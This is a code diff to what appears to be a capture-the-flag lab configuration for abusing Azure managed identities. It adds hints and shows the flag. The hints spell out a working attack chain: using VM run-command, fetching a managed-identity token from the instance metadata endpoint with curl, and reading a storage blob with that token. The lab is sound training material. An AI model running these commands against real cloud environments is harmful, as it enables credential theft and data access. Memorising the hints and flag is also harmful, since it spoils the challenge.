@@ -8,6 +8,16 @@ class ApplicationConfiguration(ApplicationConfigurationAbstract):
         key_pair_path = utils.get_key_pair_path('managed_identity_abuse')
         os.system("ssh-keygen -t rsa -b 4096 -f {} -N ''".format(key_pair_path))
 
+    def get_difficulty(self):
+        return "Intermediate"
+
+    def get_hints(self):
+        return {
+            1: "You have Virtual Machine Contributor on the VM. This role includes the RunCommand action — look up 'az vm run-command invoke'.",
+            2: "Use run-command to execute a shell script on the VM that queries the IMDS endpoint: curl -H 'Metadata: true' http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/",
+            3: "Extract the access_token from the JSON response, then: curl -H 'Authorization: Bearer <token>' -H 'x-ms-version: 2019-12-12' https://<storage_account>.blob.core.windows.net/flags/flag.txt",
+        }
+
     def get_flag(self):
         return "CUMULONIMBUS{M4n4g3d_1d3nt1ty_4bus3}"
 
